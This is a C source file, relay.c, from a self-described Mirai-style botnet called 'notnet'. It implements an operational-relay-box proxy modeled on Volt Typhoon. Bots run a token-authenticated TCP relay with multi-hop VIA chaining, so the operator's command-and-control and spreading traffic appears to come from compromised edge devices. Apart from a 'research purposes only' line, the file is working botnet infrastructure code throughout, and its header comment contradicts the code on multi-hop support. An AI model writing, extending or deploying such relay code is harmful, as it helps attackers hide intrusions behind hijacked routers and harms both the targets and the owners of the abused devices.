/*
 * notnet - Modern Mirai-Style Botnet
 * relay.c - ORB-style single-hop TCP relay (#91)
 *
 * Research purposes only.
 *
 * ORB (Operational Relay Box) pattern — the Volt Typhoon model: proxy
 * operations through compromised edge devices (SOHO routers, small
 * appliances) geographically near the victim, so C2/spread traffic no
 * longer originates from the bot's own IP. This module is the minimal
 * single-hop building block:
 *
 * client --RELAY req--> bot:relay_port --> target host:port
 *
 * Multi-hop: the request line may carry ` VIA <host>:<port>` hops
 * (`RELAY <token> <target> <port> VIA <h1>:<p1> ...`). Each relay forwards
 * the remaining chain to the next hop's listener; the last hop connects to
 * the target. Same shared token authenticates every hop.
 *
 * Flow per connection:
 *   1. Client sends one CRLF-terminated line:
 *        RELAY <token> <target_host> <target_port>
 *   2. Server checks the token (constant-time), connects to the target.
 *   3. Server replies `OK` (or `ERR <reason>`) and splices raw bytes
 *      bidirectionally until EOF or the tunnel idle timeout.
 *
 * The accept loop runs in its own pthread (started from notnet.c at boot
 * when relay_enabled=1, or at runtime via `relay on` / config_set
 * relay_enabled=1), so the relay never blocks the C2 main loop. Each
 * accepted connection is handled by a detached worker thread, capped at
 * RELAY_MAX_CONNS — the same threading structure as the SOCKS5 proxy
 * (src/proxy.c, #89), whose tunnel and connect helpers are mirrored here
 * for module isolation.
 *
 * Single-hop only. A multi-hop chain composes these hops (each hop's
 * "target" is the next relay bot's listener) but that wiring, plus
 * per-target relay selection policy, is future work. This is explicitly
 * NOT a DHT — no peer discovery, no overlay (#88).
 */
#include "relay.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

/* ── Module State ──────────────────────────────────────────── */
static pthread_t g_relay_thread;
static pthread_mutex_t g_relay_mutex = PTHREAD_MUTEX_INITIALIZER;
static volatile int g_relay_running = 0;   /* accept loop is up */
static volatile int g_relay_stop = 0;      /* stop request for accept loop */
static int g_listener_fd = -1;
static int g_relay_port = 0;               /* actual bound port */
static int g_relay_conns = 0;              /* active worker threads */
static char g_relay_token[64] = "";        /* shared fleet token */

/* ── Forward declarations (see static-function-order pitfall) ── */
static void *relay_accept_loop(void *arg);
static void *relay_conn_thread(void *arg);
static void relay_spawn_conn(int cfd);
static void relay_handle_client(int client);
static void relay_tunnel(int a, int b);
static int relay_tcp_connect(const char *host, uint16_t port, int timeout_ms);
static int relay_recv_line(int fd, char *buf, int max, int timeout_ms);
static int relay_send_all(int fd, const char *buf, int len);
static int relay_const_cmp(const unsigned char *a, int alen, const char *b);

/* ── I/O Helpers ───────────────────────────────────────────── */
/* Read one CRLF/CR/LF-terminated line into buf (NUL-terminated, bounded
 * to max bytes incl. NUL). Returns 0 on success, -1 on timeout/EOF or a
 * line longer than the buffer. */
static int relay_recv_line(int fd, char *buf, int max, int timeout_ms) {
    int got = 0;
    while (got < max - 1) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(fd, &rfds);
        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int sel = select(fd + 1, &rfds, NULL, NULL, &tv);
        if (sel <= 0) return -1;
        char c;
        int n = recv(fd, &c, 1, 0);
        if (n <= 0) return -1;
        if (c == '\n') break;
        if (c != '\r') buf[got++] = c;
    }
    if (got >= max - 1) return -1;      /* unterminated oversized line */
    buf[got] = '\0';
    return 0;
}

/* Send the whole buffer, checking each send(). Returns 0 on success. */
static int relay_send_all(int fd, const char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = send(fd, buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

/* SECURITY FIX (#91, mirrors #11): constant-time token comparison to
 * defeat the timing side-channel in the relay auth check. Returns 0 on
 * match. */
static int relay_const_cmp(const unsigned char *a, int alen, const char *b) {
    int blen = (int)strlen(b);
    if (alen != blen) return 1;
    int diff = 0;
    for (int i = 0; i < alen; i++) {
        diff |= (a[i] ^ (unsigned char)b[i]);
    }
    return diff;
}

/* ── Outbound connect (bounded, non-blocking + select) ────── */
static int relay_tcp_connect(const char *host, uint16_t port, int timeout_ms) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;          /* IPv4 destinations only */
    hints.ai_socktype = SOCK_STREAM;
    char portstr[8];
    snprintf(portstr, sizeof(portstr), "%u", (unsigned)port);

    int err = getaddrinfo(host, portstr, &hints, &res);
    if (err != 0) return -1;

    int sock = -1;
    for (struct addrinfo *ai = res; ai; ai = ai->ai_next) {
        sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (sock < 0) continue;

        int fl = fcntl(sock, F_GETFL, 0);
        if (fl < 0 || fcntl(sock, F_SETFL, fl | O_NONBLOCK) < 0) {
            close(sock); sock = -1; continue;
        }
        int c = connect(sock, ai->ai_addr, ai->ai_addrlen);
        if (c != 0 && errno != EINPROGRESS) {
            close(sock); sock = -1; continue;
        }
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(sock, &wfds);
        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int sel = select(sock + 1, NULL, &wfds, NULL, &tv);
        if (sel <= 0) {
            close(sock); sock = -1; continue;
        }
        int soerr = 0;
        socklen_t elen = sizeof(soerr);
        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &soerr, &elen) < 0 || soerr != 0) {
            close(sock); sock = -1; continue;
        }
        fcntl(sock, F_SETFL, fl);   /* back to blocking for the tunnel */
        break;
    }

    freeaddrinfo(res);
    return sock;
}

/* ── CONNECT tunnel ────────────────────────────────────────── */
/* Bidirectional splice between two fds with bounded buffers and an idle
 * timeout. Both fds are left open; the caller closes them. */
static void relay_tunnel(int a, int b) {
    char ba[RELAY_BUF_SIZE];
    char bb[RELAY_BUF_SIZE];
    int a_closed = 0, b_closed = 0;

    while (!a_closed || !b_closed) {
        fd_set rfds;
        FD_ZERO(&rfds);
        int maxfd = -1;
        if (!a_closed) { FD_SET(a, &rfds); if (a > maxfd) maxfd = a; }
        if (!b_closed) { FD_SET(b, &rfds); if (b > maxfd) maxfd = b; }
        struct timeval tv;
        tv.tv_sec = RELAY_TUNNEL_TIMEOUT / 1000;
        tv.tv_usec = (RELAY_TUNNEL_TIMEOUT % 1000) * 1000;
        int sel = select(maxfd + 1, &rfds, NULL, NULL, &tv);
        if (sel <= 0) break;    /* idle timeout or error: end the tunnel */

        if (!a_closed && FD_ISSET(a, &rfds)) {
            int n = recv(a, ba, sizeof(ba), 0);
            if (n == 0) {
                /* a half-closed: propagate its FIN as SHUT_WR on b so the
                 * peer sees EOF promptly instead of waiting for the idle
                 * timeout (#228). b may still send data back. */
                shutdown(b, SHUT_WR);
                a_closed = 1;
            } else if (n < 0) {
                /* read error: no meaningful state left, end the tunnel */
                a_closed = 1; b_closed = 1;
            } else if (relay_send_all(b, ba, n) != 0) {
                a_closed = 1; b_closed = 1;
            }
        }
        if (!b_closed && FD_ISSET(b, &rfds)) {
            int n = recv(b, bb, sizeof(bb), 0);
            if (n == 0) {
                /* mirror of the a->b case above: propagate b's FIN (#228) */
                shutdown(a, SHUT_WR);
                b_closed = 1;
            } else if (n < 0) {
                a_closed = 1; b_closed = 1;
            } else if (relay_send_all(a, bb, n) != 0) {
                a_closed = 1; b_closed = 1;
            }
        }
    }
}

/* ── Per-connection protocol handler ───────────────────────── */
/* Multi-hop chain support: the handshake accepts optional `VIA <host>:<port>`
 * hops after the target. The entry relay connects to the FIRST hop's relay
 * listener and forwards the REMAINING chain (`RELAY <token> <target> <port>
 * VIA <h2>:<p2> ...`); the last hop connects to the target. The same shared
 * fleet relay_token authenticates every hop (fail-closed). Bounded to
 * RELAY_MAX_HOPS hops; the chain line must fit RELAY_HANDSHAKE_MAX. */
#define RELAY_MAX_HOPS 8

typedef struct {
    char host[256];
    uint16_t port;
} relay_hop_t;

static void relay_handle_client(int client) {
    char line[RELAY_HANDSHAKE_MAX];

    /* 1. Request line: `RELAY <token> <target_host> <target_port>`
     *    optionally followed by ` VIA <host>:<port>` hops. */
    if (relay_recv_line(client, line, sizeof(line), RELAY_HANDSHAKE_TIMEOUT) != 0) {
        return;
    }
    char verb[8] = {0}, tok[64] = {0}, host[256] = {0};
    unsigned int port = 0;
    int nf = sscanf(line, "%7s %63s %255s %u", verb, tok, host, &port);
    if (nf != 4 || strcmp(verb, "RELAY") != 0 || port < 1 || port > 65535) {
        static const char err[] = "ERR BADREQ\r\n";
        relay_send_all(client, err, sizeof(err) - 1);
        return;
    }

    /* 2. Token check (constant-time). */
    if (relay_const_cmp((const unsigned char *)tok, (int)strlen(tok),
                        g_relay_token) != 0) {
        static const char err[] = "ERR AUTH\r\n";
        relay_send_all(client, err, sizeof(err) - 1);
        return;
    }

    /* 3. Parse the VIA chain (bounded). */
    relay_hop_t hops[RELAY_MAX_HOPS];
    int nhops = 0;
    char *scan = strstr(line, " VIA ");
    while (scan && nhops < RELAY_MAX_HOPS) {
        char *h = scan + 5;
        while (*h == ' ' || *h == '\t') h++;
        char hv[256] = {0};
        unsigned int hp = 0;
        if (sscanf(h, "%255[^:]:%u", hv, &hp) != 2 || hp < 1 || hp > 65535) {
            break;   /* malformed hop: treat the rest as not part of the chain */
        }
        snprintf(hops[nhops].host, sizeof(hops[nhops].host), "%s", hv);
        hops[nhops].port = (uint16_t)hp;
        nhops++;
        scan = strstr(h, " VIA ");
    }

    int upstream;
    if (nhops == 0) {
        /* 3a. Direct: connect to the target. */
        upstream = relay_tcp_connect(host, (uint16_t)port, RELAY_HANDSHAKE_TIMEOUT);
        if (upstream < 0) {
            static const char err[] = "ERR UNREACH\r\n";
            relay_send_all(client, err, sizeof(err) - 1);
            return;
        }
    } else {
        /* 3b. Chain: connect to the FIRST hop's relay listener. */
        upstream = relay_tcp_connect(hops[0].host, hops[0].port,
                                     RELAY_HANDSHAKE_TIMEOUT);
        if (upstream < 0) {
            static const char err[] = "ERR UNREACH\r\n";
            relay_send_all(client, err, sizeof(err) - 1);
            return;
        }
        /* Forward the REMAINING chain; the target stays the original one
         * (the last hop connects to it). */
        char fwd[RELAY_HANDSHAKE_MAX];
        int flen = snprintf(fwd, sizeof(fwd), "RELAY %s %s %u", tok, host, port);
        for (int i = 1; i < nhops; i++) {
            int n = snprintf(fwd + flen, sizeof(fwd) - (size_t)flen,
                             " VIA %s:%u", hops[i].host, hops[i].port);
            if (n < 0 || (size_t)n >= sizeof(fwd) - (size_t)flen) {
                flen = -1;   /* chain line too long */
                break;
            }
            flen += n;
        }
        if (flen < 0 || (size_t)flen >= sizeof(fwd) - 2) {
            static const char err[] = "ERR BADREQ\r\n";
            relay_send_all(client, err, sizeof(err) - 1);
            close(upstream);
            return;
        }
        snprintf(fwd + flen, sizeof(fwd) - (size_t)flen, "\r\n");

        if (relay_send_all(upstream, fwd, (int)strlen(fwd)) != 0) {
            static const char err[] = "ERR UNREACH\r\n";
            relay_send_all(client, err, sizeof(err) - 1);
            close(upstream);
            return;
        }
        /* Read the next hop's reply and mirror it (OK -> splice; ERR ->
         * forward the reason verbatim). */
        char reply[RELAY_HANDSHAKE_MAX];
        if (relay_recv_line(upstream, reply, sizeof(reply),
                            RELAY_HANDSHAKE_TIMEOUT) != 0) {
            static const char err[] = "ERR UNREACH\r\n";
            relay_send_all(client, err, sizeof(err) - 1);
            close(upstream);
            return;
        }
        if (strncmp(reply, "OK", 2) != 0) {
            char rerr[RELAY_HANDSHAKE_MAX + 4];
            snprintf(rerr, sizeof(rerr), "%s\r\n", reply);
            relay_send_all(client, rerr, (int)strlen(rerr));
            close(upstream);
            return;
        }
    }

    /* 4. Success reply, then splice raw bytes until EOF/timeout. */
    static const char ok[] = "OK\r\n";
    if (relay_send_all(client, ok, sizeof(ok) - 1) != 0) {
        close(upstream);
        return;
    }
    relay_tunnel(client, upstream);
    close(upstream);
}

/* ── Connection worker ─────────────────────────────────────── */
static void *relay_conn_thread(void *arg) {
    int cfd = *(int *)arg;
    free(arg);
    relay_handle_client(cfd);
    close(cfd);
    pthread_mutex_lock(&g_relay_mutex);
    if (g_relay_conns > 0) g_relay_conns--;
    pthread_mutex_unlock(&g_relay_mutex);
    return NULL;
}

static void relay_spawn_conn(int cfd) {
    pthread_mutex_lock(&g_relay_mutex);
    int overload = (g_relay_conns >= RELAY_MAX_CONNS);
    if (!overload) g_relay_conns++;
    pthread_mutex_unlock(&g_relay_mutex);

    if (overload) {
        /* Connection cap reached: close without a handshake reply. */
        close(cfd);
        return;
    }

    int *fdp = malloc(sizeof(int));
    if (!fdp) {
        pthread_mutex_lock(&g_relay_mutex);
        if (g_relay_conns > 0) g_relay_conns--;
        pthread_mutex_unlock(&g_relay_mutex);
        close(cfd);
        return;
    }
    *fdp = cfd;

    pthread_t t;
    if (pthread_create(&t, NULL, relay_conn_thread, fdp) != 0) {
        free(fdp);
        pthread_mutex_lock(&g_relay_mutex);
        if (g_relay_conns > 0) g_relay_conns--;
        pthread_mutex_unlock(&g_relay_mutex);
        close(cfd);
        return;
    }
    pthread_detach(t);
}

/* ── Accept loop ───────────────────────────────────────────── */
static void *relay_accept_loop(void *arg) {
    (void)arg;
    while (1) {
        if (g_relay_stop) break;

        fd_set rfds;
        FD_ZERO(&rfds);
        pthread_mutex_lock(&g_relay_mutex);
        int lfd = g_listener_fd;
        if (lfd >= 0) FD_SET(lfd, &rfds);
        pthread_mutex_unlock(&g_relay_mutex);
        if (lfd < 0) break;

        struct timeval tv = { 0, 500000 };      /* 500ms: polls stop flag */
        int sel = select(lfd + 1, &rfds, NULL, NULL, &tv);
        if (sel < 0) {
            if (errno == EINTR) continue;
            log_warn("RELAY: listener select failed: %s", strerror(errno));
            break;
        }
        if (sel == 0) continue;                 /* timeout: re-check stop */
        if (g_relay_stop) break;

        struct sockaddr_in peer;
        socklen_t plen = sizeof(peer);
        int cfd = accept(lfd, (struct sockaddr *)&peer, &plen);
        if (cfd < 0) {
            if (errno == EINTR || errno == EAGAIN || errno == ECONNABORTED) continue;
            log_warn("RELAY: accept failed: %s", strerror(errno));
            continue;
        }
        relay_spawn_conn(cfd);
    }
    return NULL;
}

/* ── Public API ────────────────────────────────────────────── */
int relay_start(notnet_bot_t *bot) {
    if (!bot) return -1;
    if (bot->relay_token[0] == '\0') {
        log_warn("RELAY: relay refused — no relay_token configured");
        return -1;
    }

    pthread_mutex_lock(&g_relay_mutex);
    if (g_relay_running) {
        pthread_mutex_unlock(&g_relay_mutex);
        return 0;                               /* already running: no-op */
    }

    int lfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (lfd < 0) {
        pthread_mutex_unlock(&g_relay_mutex);
        return -1;
    }
    int one = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    sa.sin_port = htons((uint16_t)bot->relay_port);
    if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        log_warn("RELAY: bind 0.0.0.0:%u failed: %s",
                 (unsigned)bot->relay_port, strerror(errno));
        close(lfd);
        pthread_mutex_unlock(&g_relay_mutex);
        return -1;
    }
    if (listen(lfd, 32) < 0) {
        log_warn("RELAY: listen failed: %s", strerror(errno));
        close(lfd);
        pthread_mutex_unlock(&g_relay_mutex);
        return -1;
    }

    g_listener_fd = lfd;
    g_relay_port = bot->relay_port;
    g_relay_stop = 0;
    strncpy(g_relay_token, bot->relay_token, sizeof(g_relay_token) - 1);
    g_relay_token[sizeof(g_relay_token) - 1] = '\0';

    if (pthread_create(&g_relay_thread, NULL, relay_accept_loop, NULL) != 0) {
        close(lfd);
        g_listener_fd = -1;
        pthread_mutex_unlock(&g_relay_mutex);
        return -1;
    }
    g_relay_running = 1;
    pthread_mutex_unlock(&g_relay_mutex);

    log_info("RELAY: relay listening on 0.0.0.0:%u", (unsigned)g_relay_port);
    return 0;
}

void relay_stop(void) {
    pthread_mutex_lock(&g_relay_mutex);
    if (!g_relay_running) {
        pthread_mutex_unlock(&g_relay_mutex);
        return;
    }
    g_relay_stop = 1;
    int lfd = g_listener_fd;
    g_listener_fd = -1;
    pthread_mutex_unlock(&g_relay_mutex);

    if (lfd >= 0) close(lfd);                   /* wake the accept loop */
    pthread_join(g_relay_thread, NULL);

    pthread_mutex_lock(&g_relay_mutex);
    g_relay_running = 0;
    g_relay_stop = 0;
    g_relay_port = 0;
    g_relay_token[0] = '\0';
    pthread_mutex_unlock(&g_relay_mutex);
    log_info("RELAY: relay stopped");
}

int relay_is_running(void) {
    pthread_mutex_lock(&g_relay_mutex);
    int r = g_relay_running;
    pthread_mutex_unlock(&g_relay_mutex);
    return r;
}

int relay_get_port(void) {
    pthread_mutex_lock(&g_relay_mutex);
    int p = g_relay_port;
    pthread_mutex_unlock(&g_relay_mutex);
    return p;
}

/* ── Relay client ──────────────────────────────────────────── */
int relay_connect(notnet_bot_t *bot, const char *via_host, uint16_t via_port,
                  const char *target_host, uint16_t target_port) {
    if (!bot || !via_host || !target_host) return -1;
    if (bot->relay_token[0] == '\0') {
        log_warn("RELAY: client refused — no relay_token configured");
        return -1;
    }
    if (via_port == 0 || target_port == 0) return -1;

    int fd = relay_tcp_connect(via_host, via_port, RELAY_HANDSHAKE_TIMEOUT);
    if (fd < 0) return -1;

    char req[RELAY_HANDSHAKE_MAX];
    int n = snprintf(req, sizeof(req), "RELAY %s %s %u\r\n",
                     bot->relay_token, target_host, (unsigned)target_port);
    if (n < 0 || (size_t)n >= sizeof(req)) {
        close(fd);
        return -1;
    }
    if (relay_send_all(fd, req, n) != 0) {
        close(fd);
        return -1;
    }

    char resp[RELAY_HANDSHAKE_MAX];
    if (relay_recv_line(fd, resp, sizeof(resp), RELAY_HANDSHAKE_TIMEOUT) != 0) {
        close(fd);
        return -1;
    }
    if (strncmp(resp, "OK", 2) != 0) {
        log_warn("RELAY: relay refused: %s", resp[0] ? resp : "no reply");
        close(fd);
        return -1;
    }
    return fd;
}

int relay_probe(notnet_bot_t *bot, const char *target_host, uint16_t target_port,
                const char *via_host, uint16_t via_port, long *rtt_ms) {
    if (!bot || !target_host || target_port == 0) return -1;
    if (rtt_ms) *rtt_ms = 0;

    uint64_t t0 = get_timestamp_ms();
    int fd;
    if (via_host && via_host[0] != '\0') {
        fd = relay_connect(bot, via_host, via_port, target_host, target_port);
    } else {
        fd = relay_tcp_connect(target_host, target_port, RELAY_HANDSHAKE_TIMEOUT);
    }
    if (fd < 0) return -1;
    if (rtt_ms) *rtt_ms = (long)(get_timestamp_ms() - t0);
    close(fd);
    return 0;
}

/* Chain-aware reachability probe: `chain` is the multi-hop suffix the
 * operator specified, e.g. " VIA 1.2.3.4:1081 VIA 5.6.7.8:1081" (leading
 * space required). The probe connects to the FIRST hop (the entry relay)
 * and forwards the remaining chain, matching relay_handle_client's
 * semantics; NULL/empty chain = direct probe. Returns 0 on success (the
 * full chain answered OK), -1 on any failure; *rtt_ms receives the
 * handshake round-trip. */
int relay_probe_chain(notnet_bot_t *bot, const char *target_host,
                      uint16_t target_port, const char *chain, long *rtt_ms) {
    if (!bot || !target_host || target_port == 0) return -1;
    if (rtt_ms) *rtt_ms = 0;
    if (bot->relay_token[0] == '\0') {
        log_warn("RELAY: client refused — no relay_token configured");
        return -1;
    }

    uint64_t t0 = get_timestamp_ms();
    if (!chain || chain[0] == '\0') {
        int fd = relay_tcp_connect(target_host, target_port, RELAY_HANDSHAKE_TIMEOUT);
        if (fd < 0) return -1;
        if (rtt_ms) *rtt_ms = (long)(get_timestamp_ms() - t0);
        close(fd);
        return 0;
    }

    /* First hop = the entry relay this bot dials directly. */
    char *p = strstr(chain, " VIA ");
    if (!p) return -1;
    char *h = p + 5;
    while (*h == ' ' || *h == '\t') h++;
    char hv[256] = {0};
    unsigned int hp = 0;
    if (sscanf(h, "%255[^:]:%u", hv, &hp) != 2 || hp < 1 || hp > 65535) return -1;

    int fd = relay_tcp_connect(hv, (uint16_t)hp, RELAY_HANDSHAKE_TIMEOUT);
    if (fd < 0) return -1;

    /* Forward the REMAINING chain (hops after the first). */
    char *rest = strstr(h, " VIA ");
    char req[RELAY_HANDSHAKE_MAX];
    int n;
    if (rest) {
        n = snprintf(req, sizeof(req), "RELAY %s %s %u%s\r\n",
                     bot->relay_token, target_host, (unsigned)target_port, rest);
    } else {
        n = snprintf(req, sizeof(req), "RELAY %s %s %u\r\n",
                     bot->relay_token, target_host, (unsigned)target_port);
    }
    if (n < 0 || (size_t)n >= sizeof(req)) {
        close(fd);
        return -1;
    }
    if (relay_send_all(fd, req, n) != 0) {
        close(fd);
        return -1;
    }
    char resp[RELAY_HANDSHAKE_MAX];
    if (relay_recv_line(fd, resp, sizeof(resp), RELAY_HANDSHAKE_TIMEOUT) != 0) {
        close(fd);
        return -1;
    }
    if (strncmp(resp, "OK", 2) != 0) {
        log_warn("RELAY: chain refused: %s", resp[0] ? resp : "no reply");
        close(fd);
        return -1;
    }
    if (rtt_ms) *rtt_ms = (long)(get_timestamp_ms() - t0);
    close(fd);
    return 0;
}
